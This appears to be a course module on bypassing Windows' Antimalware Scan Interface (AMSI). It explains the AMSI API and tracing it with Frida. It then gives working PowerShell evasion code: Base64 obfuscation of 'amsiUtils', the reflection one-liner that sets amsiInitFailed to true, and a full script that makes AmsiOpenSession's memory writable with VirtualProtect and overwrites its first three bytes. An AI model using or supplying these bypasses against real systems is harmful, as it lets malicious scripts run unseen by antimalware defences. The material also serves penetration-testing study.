# AMSI Bypass

Antimalware Scan Interface (AMSI) is able to detect the malicious file even if the are never written to disk. Explore the impact of WinDefender's implementation of AMSI on PowerShell and Jscript

This repo [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) is VERY GOOD, you can research more deeply on your own. 

## Antimalware Scan Interface (AMSI)
Tool Debug: WinDbg, x64dbg, Immunity Debugger, ...        
Ref: https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/


To protect against malicious PowerShell scripts, Microsoft introduced the **Antimalware Scan Interface (AMSI)** to allow run-time inspection of all PowerShell commands or scripts. AMSI identify and block malicious scripts even if they are heavily obfuscated

The AMSI feature is integrated into these components of Windows OS
- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

References & Credit:
- https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps
- https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
- https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions

The Antimalware Scan Interface (AMSI) is a standardized interface which Windows applications can use to interact with the *Antimalware software* in use. The following diagram illustrates from a high level how it works - the important thing to take away from this is that applications can make use of the functions [AmsiScanBuffer](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) and [AmsiScanString](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring) to scan input for malicious content.

![](https://learn.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg)

*Win32 AMSI API function*

| Function                                                                                                          | Description                                                                                                                                                            |
| ----------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [**AmsiCloseSession**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiclosesession)       | Close a session that was opened by [AmsiOpenSession](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession).                              |
| [**AmsiInitialize**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize)           | Initialize the AMSI API.                                                                                                                                               |
| [**AmsiNotifyOperation**](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsinotifyoperation)   | Sends to the antimalware provider a notification of an arbitrary operation.                                                                                            |
| [**AmsiOpenSession**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession)         | Opens a session within which multiple scan requests can be correlated.                                                                                                 |
| [**AmsiResultIsMalware**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiresultismalware) | Determines if the result of a scan indicates that the content should be blocked.                                                                                       |
| [**AmsiScanBuffer**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer)           | Scans a buffer-full of content for malware.                                                                                                                            |
| [**AmsiScanString**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanstring)           | Scans a string for malware.                                                                                                                                            |
| [**AmsiUninitialize**](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiuninitialize)       | Remove the instance of the AMSI API that was originally opened by [AmsiInitialize](https://learn.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize). |

The AMSI exported APIs include AmsiInitialize, AmsiOpenSession, AmsiScanString, AmsiScanBuffer, and AmsiCloseSession ...

## Trace AMSI Win32 APIs
Use [Frida](https://frida.re/) to trace the calls to the exported AMSI calls. Frida can hook Win32 APIs through a Python backend while using JavaScript to display and interpret arguments and return values.

For e.g: the Powershell process ID is 1234. Use the follow Frida command 

```powershell
frida-trace -p 1234 -x amsi.dll -i Amsi*
```

If input is: `AmsiUtils` then *AmsiScanBuffer()* returns the value 32768 equal malicious        
If input is: `AmsiUtils` then *AmsiScanBuffer()* returns the value 1 equal non-malicious        

## Bypassing AMS with String Manipulation
This technique is called **String Manipulation**

1. String concatenation: (`"amsi" and "Utils"`)
2. Utilizing Base64-encoding: 

```powershell
PS C:\Users\Admin> [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('YW1zaVV0aWxz'))
amsiUtils
```
## Bypassing AMSI with Reflection
Credit:  [Matt Graeber](https://twitter.com/mattifestation) from 2016

PowerShell stores information about AMSI in managed code inside the `System.Management.Automation.AmsiUtils` class - can enumerate and interact with through reflection. From [Module 3](https://github.com/col-1002/OSEP-Course/blob/main/Modules/Module%203.%20Client%20Side%20Code%20Execution%20With%20Office.md) the key element of reflection is the [GetType](https://learn.microsoft.com/en-us/dotnet/api/system.object.gettype?view=net-8.0) method which wil be invoke through [System.Management.Automation.PSReference](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.psreference?view=powershellsdk-7.4.0) class, also called `[Ref]`. 

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

We can't use this basic method because WinDefender regularly updates the signatures. 

### Static analysis (dnSpy)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

OK, under the hood. Load referenced assembly file `System.Management.Automation.dll` into [dnSpy](https://github.com/dnSpyEx/dnSpy).

```
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\
```

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/System_Management_Automation_dll_v1.png)

`ScanContent` method -> if the value of the `amsiInitFailed` variable is set to `TRUE` return `AMSI_RESULT_NOT_DETECTED`

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/System_Management_Automation_dll_v2.png)

```powershell
	if (AmsiUtils.amsiInitFailed)
	{
		return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
	}
```

OK, the payload bypass set `amsiInitFailed` to `true` so that the method `ScanContent` will always return `AMSI_RESULT_NOT_DETECTED`
## Bypassing AMSI in PowerShell -> Patch Win32 AMSI API
### Patch `AmsiOpenSession`
The attack process takes place in 3 steps:
1. obtain the memory address of `AmsiOpenSession`
2. modify the memory permissions where `AmsiOpenSession` is located
3. modify the three bytes at that location

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).
    Invoke($null, @($moduleName)), $functionName))
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
	$type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
	$type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$oldProtectionBuffer = 0 
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))) 
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) # change 0x40 = PAGE_EXECUTE_READWRITE

$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3) # copy the assembly
```












